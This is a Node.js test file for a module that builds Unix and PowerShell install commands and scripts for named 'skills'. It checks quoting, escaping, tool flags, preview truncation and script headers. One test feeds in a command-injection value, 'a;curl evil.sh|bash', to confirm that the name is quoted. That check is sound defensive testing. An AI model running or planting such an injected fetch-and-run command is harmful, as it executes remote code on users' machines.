// Executa o .ts via transpile do proprio Node (--experimental-strip-types em 22+).
import assert from "node:assert/strict";
import test from "node:test";
import { buildInstallCommand, buildInstallScript } from "../lib/installCommand.ts";

test("quotes skill names in both shells", () => {
  const evil = ["a;curl evil.sh|bash"];

  const unix = buildInstallCommand({ skills: evil, tool: "all", os: "unix" });
  assert.match(unix, /--skills 'a;curl evil\.sh\|bash'/);

  const pwsh = buildInstallCommand({ skills: evil, tool: "all", os: "windows" });
  assert.match(pwsh, /-Skills @\('a;curl evil\.sh\|bash'\)/);
});

test("escapes embedded quotes per shell dialect", () => {
  assert.match(
    buildInstallCommand({ skills: ["it's"], tool: "all", os: "unix" }),
    /'it'\\''s'/,
  );
  assert.match(
    buildInstallCommand({ skills: ["it's"], tool: "all", os: "windows" }),
    /'it''s'/,
  );
});

test("adds the tool flag only when scoped", () => {
  const scoped = buildInstallCommand({ skills: ["a"], tool: "claude", os: "unix" });
  const all = buildInstallCommand({ skills: ["a"], tool: "all", os: "unix" });
  assert.match(scoped, /--tools claude/);
  assert.doesNotMatch(all, /--tools/);
});

test("truncates preview and reports the remainder", () => {
  const cmd = buildInstallCommand({
    skills: ["a", "b", "c", "d"],
    tool: "all",
    os: "unix",
    preview: 2,
  });
  assert.match(cmd, /'a','b',… \+2/);
});

test("generates a runnable script per OS", () => {
  const sh = buildInstallScript(["a"], "all", "unix");
  assert.equal(sh.filename, "instalar-maleta.sh");
  assert.match(sh.content, /^#!\/usr\/bin\/env bash/);
  assert.match(sh.content, /set -euo pipefail/);

  const ps = buildInstallScript(["a"], "claude", "windows");
  assert.equal(ps.filename, "instalar-maleta.ps1");
  assert.match(ps.content, /\$ErrorActionPreference = 'Stop'/);
  assert.match(ps.content, /-Tools claude/);
});
